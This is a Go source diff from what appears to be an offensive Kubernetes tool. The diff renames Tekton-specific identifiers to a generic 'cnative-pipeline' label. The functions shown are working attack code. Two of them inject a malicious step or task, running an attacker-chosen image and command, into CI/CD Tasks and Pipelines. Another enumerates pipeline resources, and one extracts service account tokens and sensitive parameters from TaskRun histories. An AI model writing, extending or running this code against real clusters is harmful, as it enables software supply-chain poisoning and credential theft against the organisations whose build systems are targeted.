@@ -13,26 +13,26 @@ import (
 )
 
 var (
-	tektonTaskGVR = schema.GroupVersionResource{
+	cnativePipelineTaskGVR = schema.GroupVersionResource{
 		Group: "tekton.dev", Version: "v1", Resource: "tasks",
 	}
-	tektonPipelineGVR = schema.GroupVersionResource{
+	cnativePipelineGVR = schema.GroupVersionResource{
 		Group: "tekton.dev", Version: "v1", Resource: "pipelines",
 	}
-	tektonTaskRunGVR = schema.GroupVersionResource{
+	cnativePipelineTaskRunGVR = schema.GroupVersionResource{
 		Group: "tekton.dev", Version: "v1", Resource: "taskruns",
 	}
 )
 
-// PoisonTektonTask injects a malicious init step into a Tekton Task that executes before legitimate steps.
-func PoisonTektonTask(ctx context.Context, dynClient dynamic.Interface, ns, taskName, image, command string) (*PoisonResult, error) {
+// PoisonCnativePipelineTask injects a malicious init step into a cnative-pipeline Task that executes before legitimate steps.
+func PoisonCnativePipelineTask(ctx context.Context, dynClient dynamic.Interface, ns, taskName, image, command string) (*PoisonResult, error) {
 	result := &PoisonResult{
-		Platform: "tekton",
+		Platform: "cnative-pipeline",
 		Action:   "poison_task",
 		Target:   taskName,
 	}
 
-	task, err := dynClient.Resource(tektonTaskGVR).Namespace(ns).Get(ctx, taskName, metav1.GetOptions{})
+	task, err := dynClient.Resource(cnativePipelineTaskGVR).Namespace(ns).Get(ctx, taskName, metav1.GetOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("failed to get task: %v", err)
 		return result, nil
@@ -62,7 +62,7 @@ func PoisonTektonTask(ctx context.Context, dynClient dynamic.Interface, ns, task
 		return result, nil
 	}
 
-	_, err = dynClient.Resource(tektonTaskGVR).Namespace(ns).Update(ctx, task, metav1.UpdateOptions{})
+	_, err = dynClient.Resource(cnativePipelineTaskGVR).Namespace(ns).Update(ctx, task, metav1.UpdateOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("update failed: %v", err)
 		return result, nil
@@ -73,15 +73,15 @@ func PoisonTektonTask(ctx context.Context, dynClient dynamic.Interface, ns, task
 	return result, nil
 }
 
-// PoisonTektonPipeline injects a malicious task at the beginning of a Tekton Pipeline definition.
-func PoisonTektonPipeline(ctx context.Context, dynClient dynamic.Interface, ns, pipelineName, image, command string) (*PoisonResult, error) {
+// PoisonCnativePipelineDef injects a malicious task at the beginning of a cnative-pipeline Pipeline definition.
+func PoisonCnativePipelineDef(ctx context.Context, dynClient dynamic.Interface, ns, pipelineName, image, command string) (*PoisonResult, error) {
 	result := &PoisonResult{
-		Platform: "tekton",
+		Platform: "cnative-pipeline",
 		Action:   "poison_pipeline",
 		Target:   pipelineName,
 	}
 
-	pipeline, err := dynClient.Resource(tektonPipelineGVR).Namespace(ns).Get(ctx, pipelineName, metav1.GetOptions{})
+	pipeline, err := dynClient.Resource(cnativePipelineGVR).Namespace(ns).Get(ctx, pipelineName, metav1.GetOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("failed to get pipeline: %v", err)
 		return result, nil
@@ -113,7 +113,7 @@ func PoisonTektonPipeline(ctx context.Context, dynClient dynamic.Interface, ns, 
 		return result, nil
 	}
 
-	_, err = dynClient.Resource(tektonPipelineGVR).Namespace(ns).Update(ctx, pipeline, metav1.UpdateOptions{})
+	_, err = dynClient.Resource(cnativePipelineGVR).Namespace(ns).Update(ctx, pipeline, metav1.UpdateOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("update failed: %v", err)
 		return result, nil
@@ -124,11 +124,11 @@ func PoisonTektonPipeline(ctx context.Context, dynClient dynamic.Interface, ns, 
 	return result, nil
 }
 
-// ListTektonResources enumerates Tasks, Pipelines, and TaskRuns in the given namespace.
-func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
+// ListCnativePipelineResources enumerates Tasks, Pipelines, and TaskRuns in the given namespace.
+func ListCnativePipelineResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
 	var sb strings.Builder
 
-	tasks, err := ListCRDs(ctx, dynClient, tektonTaskGVR, ns)
+	tasks, err := ListCRDs(ctx, dynClient, cnativePipelineTaskGVR, ns)
 	if err == nil {
 		fmt.Fprintf(&sb, "Tasks (%d):\n", len(tasks))
 		for _, t := range tasks {
@@ -136,7 +136,7 @@ func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns st
 		}
 	}
 
-	pipelines, err := ListCRDs(ctx, dynClient, tektonPipelineGVR, ns)
+	pipelines, err := ListCRDs(ctx, dynClient, cnativePipelineGVR, ns)
 	if err == nil {
 		fmt.Fprintf(&sb, "Pipelines (%d):\n", len(pipelines))
 		for _, p := range pipelines {
@@ -144,7 +144,7 @@ func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns st
 		}
 	}
 
-	runs, err := ListCRDs(ctx, dynClient, tektonTaskRunGVR, ns)
+	runs, err := ListCRDs(ctx, dynClient, cnativePipelineTaskRunGVR, ns)
 	if err == nil {
 		fmt.Fprintf(&sb, "TaskRuns (%d):\n", len(runs))
 		for _, r := range runs {
@@ -156,15 +156,15 @@ func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns st
 	return sb.String(), nil
 }
 
-// StealTektonSecrets extracts service account tokens and sensitive parameters from TaskRun histories.
-func StealTektonSecrets(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
-	runs, err := ListCRDs(ctx, dynClient, tektonTaskRunGVR, ns)
+// StealCnativePipelineSecrets extracts service account tokens and sensitive parameters from TaskRun histories.
+func StealCnativePipelineSecrets(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
+	runs, err := ListCRDs(ctx, dynClient, cnativePipelineTaskRunGVR, ns)
 	if err != nil {
 		return "", err
 	}
 
 	var sb strings.Builder
-	sb.WriteString("Tekton TaskRun Credentials:\n")
+	sb.WriteString("cnative-pipeline TaskRun Credentials:\n")
 
 	for _, r := range runs {
 		podName, _, _ := unstructured.NestedString(r.Object, "status", "podName")
